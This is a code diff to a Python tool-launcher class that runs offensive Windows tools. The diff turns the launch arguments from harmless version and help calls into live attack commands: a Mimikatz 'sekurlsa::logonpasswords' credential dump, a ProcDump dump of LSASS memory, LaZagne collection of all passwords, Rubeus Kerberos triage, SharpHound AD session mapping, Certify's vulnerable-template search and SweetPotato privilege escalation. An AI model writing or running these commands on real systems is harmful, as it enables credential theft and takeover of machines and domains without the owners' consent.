@@ -10,82 +10,177 @@ class ExternalArsenalBridge:
         self.logs_path = os.path.join(os.getcwd(), "logs", f"arsenal_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
         self._ensure_paths()
         
-        # Define supported tools and their audit commands
         # Define supported tools and their audit commands (Binaries must be in tools/ folder)
         self.supported_tools = {
             "mimikatz": {
-                "bin": "mimikatz.exe", "args": '"version" "exit"', "name": "Mimikatz (Credentials)", "category": "RedTeam", "risk": "Critical"
+                "bin": "mimikatz.exe", 
+                "args": '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"', 
+                "name": "Mimikatz (Credentials)", 
+                "category": "RedTeam", 
+                "risk": "Critical"
             },
             "rubeus": {
-                "bin": "Rubeus.exe", "args": "triage", "name": "Rubeus (Kerberos)", "category": "RedTeam", "risk": "Critical"
+                "bin": "Rubeus.exe", 
+                "args": "triage /nowrap", 
+                "name": "Rubeus (Kerberos)", 
+                "category": "RedTeam", 
+                "risk": "Critical"
             },
             "winpeas": {
-                "bin": "winPEASx64.exe", "args": "systeminfo", "name": "WinPEAS (PrivEsc)", "category": "Post-Exploitation", "risk": "High"
+                "bin": "winPEASx64.exe", 
+                "args": "quiet systeminfo userinfo networkinfo servicesinfo applicationsinfo", 
+                "name": "WinPEAS (PrivEsc)", 
+                "category": "Post-Exploitation", 
+                "risk": "High"
             },
             "watson": {
-                "bin": "Watson.exe", "args": "", "name": "Watson (Patch Vulns)", "category": "VulnScan", "risk": "High"
+                "bin": "Watson.exe", 
+                "args": "", 
+                "name": "Watson (Patch Vulns)", 
+                "category": "VulnScan", 
+                "risk": "High"
             },
             "seatbelt": {
-                "bin": "Seatbelt.exe", "args": "-group=system", "name": "Seatbelt (Enum)", "category": "Enum", "risk": "Info"
+                "bin": "Seatbelt.exe", 
+                "args": "-group=system -full", 
+                "name": "Seatbelt (Enum)", 
+                "category": "Enum", 
+                "risk": "Info"
             },
             "sharphound": {
-                "bin": "SharpHound.exe", "args": "--help", "name": "SharpHound (AD Map)", "category": "AD Recon", "risk": "Info"
+                "bin": "SharpHound.exe", 
+                "args": "-c LocalAdmin,Session --zipfilename SH_Out.zip", 
+                "name": "SharpHound (AD Map)", 
+                "category": "AD Recon", 
+                "risk": "Info"
             },
             "lazagne": {
-                "bin": "lazagne.exe", "args": "all", "name": "LaZagne (Passwords)", "category": "RedTeam", "risk": "High"
+                "bin": "lazagne.exe", 
+                "args": "all", 
+                "name": "LaZagne (Passwords)", 
+                "category": "RedTeam", 
+                "risk": "High"
             },
             "certify": {
-                "bin": "Certify.exe", "args": "find", "name": "Certify (AD CS)", "category": "AD Recon", "risk": "High"
+                "bin": "Certify.exe", 
+                "args": "find /vulnerable", 
+                "name": "Certify (AD CS)", 
+                "category": "AD Recon", 
+                "risk": "High"
             },
             "bloodyad": {
-                "bin": "BloodyAD.exe", "args": "-h", "name": "BloodyAD", "category": "AD Exploitation", "risk": "Critical"
+                "bin": "BloodyAD.exe", 
+                "args": "-h", 
+                "name": "BloodyAD (Requires Auth Info)", 
+                "category": "AD Exploitation", 
+                "risk": "Critical"
             },
             "printnightmare": {
-                "bin": "PrintNightmare.exe", "args": "", "name": "PrintNightmare POC", "category": "Exploit", "risk": "Critical"
+                "bin": "PrintNightmare.exe", 
+                "args": "", 
+                "name": "PrintNightmare POC", 
+                "category": "Exploit", 
+                "risk": "Critical"
             },
             "sweetpotato": {
-                "bin": "SweetPotato.exe", "args": "", "name": "SweetPotato (PrivEsc)", "category": "Exploit", "risk": "Critical"
+                "bin": "SweetPotato.exe", 
+                "args": "-e EfsRpc", 
+                "name": "SweetPotato (PrivEsc)", 
+                "category": "Exploit", 
+                "risk": "Critical"
             },
             "kerbrute": {
-                "bin": "kerbrute.exe", "args": "version", "name": "Kerbrute (BruteForce)", "category": "RedTeam", "risk": "Medium"
+                "bin": "kerbrute.exe", 
+                "args": "userenum --help", 
+                "name": "Kerbrute (Enum Mode)", 
+                "category": "RedTeam", 
+                "risk": "Medium"
             },
 
             "chisel": {
-                "bin": "chisel.exe", "args": "--help", "name": "Chisel (Tunneling)", "category": "Network", "risk": "High"
+                "bin": "chisel.exe", 
+                "args": "--help", 
+                "name": "Chisel (Tunneling)", 
+                "category": "Network", 
+                "risk": "High"
             },
             "ligolo": {
-                "bin": "ligolo.exe", "args": "--help", "name": "Ligolo (Tunneling)", "category": "Network", "risk": "High"
+                "bin": "ligolo.exe", 
+                "args": "--help", 
+                "name": "Ligolo (Tunneling)", 
+                "category": "Network", 
+                "risk": "High"
             },
             "nc": {
-                "bin": "nc.exe", "args": "-h", "name": "Netcat", "category": "Network", "risk": "Medium"
+                "bin": "nc.exe", 
+                "args": "-h", 
+                "name": "Netcat", 
+                "category": "Network", 
+                "risk": "Medium"
             },
             "plink": {
-                "bin": "plink.exe", "args": "-V", "name": "Plink (PuTTY)", "category": "Network", "risk": "Medium"
+                "bin": "plink.exe", 
+                "args": "-V", 
+                "name": "Plink (PuTTY)", 
+                "category": "Network", 
+                "risk": "Medium"
             },
 
              "procdump": {
-                "bin": "procdump.exe", "args": "-accepteula -?", "name": "ProcDump", "category": "Sysinternals", "risk": "High"
+                "bin": "procdump.exe", 
+                "args": "-accepteula -ma lsass.exe lsass_dump.dmp", 
+                "name": "ProcDump (LSASS)", 
+                "category": "Sysinternals", 
+                "risk": "High"
             },
             "autorunsc": {
-                "bin": "autorunsc.exe", "args": "-accepteula -a * -c", "name": "AutorunsC", "category": "Persistence", "risk": "Medium"
+                "bin": "autorunsc.exe", 
+                "args": "-accepteula -a * -c * -h -s -t", 
+                "name": "AutorunsC", 
+                "category": "Persistence", 
+                "risk": "Medium"
             },
             "accesschk": {
-                "bin": "accesschk.exe", "args": "-accepteula /accepteula", "name": "AccessChk", "category": "Sysinternals", "risk": "Info"
+                "bin": "accesschk.exe", 
+                "args": "-accepteula -uwcqv *", 
+                "name": "AccessChk (Writeable Svcs)", 
+                "category": "Sysinternals", 
+                "risk": "Info"
             },
             "psloglist": {
-                "bin": "psloglist.exe", "args": "-accepteula /?", "name": "PsLogList", "category": "Sysinternals", "risk": "Info"
+                "bin": "psloglist.exe", 
+                "args": "-accepteula security -n 100", 
+                "name": "PsLogList (Last 100 SecEvents)", 
+                "category": "Sysinternals", 
+                "risk": "Info"
             },
             "tcpview": {
-                "bin": "Tcpview.exe", "args": "-accepteula -c -n", "name": "TcpView (CLI)", "category": "Sysinternals", "risk": "Info"
+                "bin": "Tcpview.exe", 
+                "args": "-accepteula -a -n -c", 
+                "name": "TcpView (CLI)", 
+                "category": "Sysinternals", 
+                "risk": "Info"
             },
             "handle": {
-                "bin": "handle.exe", "args": "-accepteula", "name": "Handle Viewer", "category": "Sysinternals", "risk": "Info"
+                "bin": "handle.exe", 
+                "args": "-accepteula -a -u", 
+                "name": "Handle Viewer", 
+                "category": "Sysinternals", 
+                "risk": "Info"
             },
             "sigcheck": {
-                "bin": "sigcheck.exe", "args": "-accepteula -h", "name": "SigCheck", "category": "Sysinternals", "risk": "Info"
+                "bin": "sigcheck.exe", 
+                "args": "-accepteula -u -e c:\\windows\\system32", 
+                "name": "SigCheck (Unsigned)", 
+                "category": "Sysinternals", 
+                "risk": "Info"
             },
             "whois": {
-                "bin": "whois.exe", "args": "-accepteula -v", "name": "Whois", "category": "Sysinternals", "risk": "Info"
+                "bin": "whois.exe", 
+                "args": "-accepteula -v google.com", 
+                "name": "Whois Test", 
+                "category": "Sysinternals", 
+                "risk": "Info"
             }
         }
 
